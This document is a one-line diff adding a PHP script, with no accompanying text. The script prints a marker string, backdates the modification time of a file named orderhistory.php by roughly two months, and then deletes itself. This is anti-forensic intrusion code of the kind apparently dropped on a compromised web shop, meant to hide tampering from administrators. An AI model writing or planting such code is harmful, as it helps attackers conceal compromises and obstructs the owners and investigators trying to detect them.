@@ -1,0 +1,1 @@
+<?php echo "puTtDAmceG"; if (file_exists("./orderhistory.php")){ touch("./orderhistory.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*cnCQFvWHmPMqZ6YvX1eG*/ ?>
